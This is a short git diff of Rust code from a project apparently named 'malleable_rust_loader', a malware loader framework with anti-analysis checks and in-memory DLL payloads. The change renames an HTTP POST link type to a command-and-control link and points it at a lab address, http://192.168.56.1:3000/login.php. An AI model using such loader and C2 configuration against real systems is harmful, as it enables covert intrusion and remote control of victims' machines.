@@ -9,7 +9,7 @@ use malleable_rust_loader::defuse::Hostname;
 use malleable_rust_loader::defuse::Operator;
 use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
-use malleable_rust_loader::link::HTTPPostLink;
+use malleable_rust_loader::link::HTTPPostC2Link;
 use malleable_rust_loader::link::Link;
 use malleable_rust_loader::link::MemoryLink;
 use malleable_rust_loader::payload::DllFromMemory;
@@ -235,7 +235,7 @@ exec(decoded_script)
                         jitt: 0,
                         sleep: 0,
                     }), */
-                    Link::HTTPost(HTTPPostLink {
+                    Link::HTTPPostC2(HTTPPostC2Link {
                         url: String::from("http://192.168.56.1:3000/login.php"),
                         dataoperation: vec![],
                         dataoperation_post: vec![],
